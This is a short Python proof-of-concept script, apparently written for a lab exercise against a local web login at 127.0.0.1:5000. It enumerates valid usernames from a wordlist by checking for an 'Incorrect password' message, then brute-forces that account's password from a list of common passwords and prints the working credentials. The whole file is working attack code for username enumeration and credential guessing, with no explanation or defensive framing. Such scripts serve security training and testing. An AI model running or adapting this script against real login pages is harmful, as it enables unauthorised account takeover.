# poc.py

import requests

url = "http://127.0.0.1:5000/login"

# wordlist username
usernames = [
    "admin",
    "administrator",
    "root",
    "carlos",
    "test",
    "guest"
]

print("[*] Enumerating usernames...")

valid_user = None

for user in usernames:
    data = {
        "username": user,
        "password": "wrongpass"
    }

    r = requests.post(url, data=data)

    if "Incorrect password" in r.text:
        print(f"[+] Found valid username: {user}")
        valid_user = user
        break
    else:
        print(f"[-] Invalid: {user}")

if not valid_user:
    print("No valid username found.")
    exit()

# brute password
passwords = [
    "123456",
    "password",
    "qwerty",
    "supersecret",
    "admin123"
]

print(f"\n[*] Brute forcing password for {valid_user}...")

for pwd in passwords:
    data = {
        "username": valid_user,
        "password": pwd
    }

    r = requests.post(url, data=data)

    if "Welcome" in r.text:
        print(f"[+] SUCCESS: {valid_user}:{pwd}")
        break
    else:
        print(f"[-] Wrong password: {pwd}")